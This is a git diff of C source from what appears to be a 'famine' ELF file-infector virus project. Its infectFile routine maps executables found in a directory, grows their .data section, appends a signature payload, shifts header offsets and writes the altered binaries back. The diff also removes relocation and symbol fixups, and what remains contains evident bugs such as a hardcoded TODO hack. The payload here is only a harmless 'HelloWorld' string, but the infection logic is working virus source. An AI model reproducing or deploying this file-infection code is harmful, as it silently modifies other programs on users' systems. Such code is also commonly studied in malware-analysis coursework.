@@ -1,9 +1,8 @@
 #include "famine.h"
-const char *payload = "HelloWorldaaaaa";
+const char *payload = "HelloWorld";
 
 static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
     size_t      i;
-    size_t      size;
     Elf64_Shdr  *section;
     Elf64_Phdr  *program;
 
@@ -18,58 +17,6 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
         section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
         if (section->sh_offset > offset)
             section->sh_offset += toAdd;
-        if (section->sh_addr > offset)
-            section->sh_addr += toAdd;
-        if (section->sh_type == SHT_REL) {
-            Elf64_Rel *rel;
-            size = 0;
-            while (size < section->sh_size) {
-              rel = ((void *)header) + section->sh_offset + (sizeof(Elf64_Rel) * (size / sizeof(Elf64_Rel)));
-              if (rel->r_offset > offset)
-                rel->r_offset += toAdd;
-              size += sizeof(Elf64_Rel);
-            }
-        } else if (section->sh_type == SHT_RELA) {
-            Elf64_Rela  *rela;
-            size = 0;
-            while (size < section->sh_size) {
-              rela = ((void *)header) + section->sh_offset + (sizeof(Elf64_Rela) * (size / sizeof(Elf64_Rela)));
-              if (rela->r_offset > offset) {
-                // TODO Remove this
-                if (!(rela->r_offset == 0x4fe0 && toAdd == 8)) {
-                  rela->r_offset += toAdd;
-                }
-              }
-              size += sizeof(Elf64_Rela);
-            }
-        } else if (section->sh_type == SHT_DYNAMIC) {
-            Elf64_Dyn *dyn;
-            size = 0;
-            while (size < section->sh_size) {
-              dyn = ((void *)header) + section->sh_offset + (sizeof(Elf64_Dyn) * (size / sizeof(Elf64_Dyn)));
-              if (dyn->d_un.d_ptr > offset)
-                dyn->d_un.d_ptr += toAdd;
-              size += sizeof(Elf64_Dyn);
-            }
-        } else if (section->sh_type == SHT_GNU_verdef) {
-            Elf64_Verdef  *verdef;
-            verdef = ((void *)header) + section->sh_offset;
-            if (section->sh_offset < offset && verdef->vd_aux > offset)
-              verdef->vd_aux += toAdd;
-            if (section->sh_offset < offset && verdef->vd_next > offset)
-              verdef->vd_aux += toAdd;
-        } else if (section->sh_type == SHT_SYMTAB) {
-          Elf64_Xword size;
-          Elf64_Sym   *symbol;
-          size = 0;
-          while (size < section->sh_size) {
-            symbol = ((void *)header) + section->sh_offset + size;
-            if (symbol->st_value > offset) {
-              symbol->st_value += toAdd;
-            }
-            size += sizeof(Elf64_Sym);
-          }
-        }
         i += 1;
     }
     i = 0;
@@ -77,8 +24,6 @@ static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
         program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
         if (program->p_offset > offset)
             program->p_offset += toAdd;
-        if (program->p_vaddr > offset)
-            program->p_vaddr += toAdd;
         if (program->p_paddr > offset)
             program->p_paddr += toAdd;
         i += 1;
@@ -170,19 +115,17 @@ static int  appendSignature(struct bfile file, size_t offset) {
 static int  infectFile(const char *dirname, struct dirent *file) {
   Elf64_Shdr    *data;
   struct bfile  header;
+  size_t        offset;
 
   if (mapFile(dirname, file->d_name, &header) == -1)
     return (0);
   if ((size_t)(header.size) < sizeof(Elf64_Ehdr) || !isCompatible(header.header->e_ident, header.header->e_machine))
     return (0);
-  dprintf(1, "File %s is compatible\n", file->d_name);
   data = getDataSectionHeader(header.header);
   data->sh_size += strlen(payload) + 1;
-  size_t  offset;
   offset = data->sh_offset;
   appendSignature(header, offset + data->sh_size - strlen(payload) - 1);
   header.size += strlen(payload) + 1;
-  dprintf(1, "Changed data name\n");
   updateOffsets(header.header, offset, strlen(payload) + 1);
   writeToFile(dirname, file->d_name, header);
   return (0);
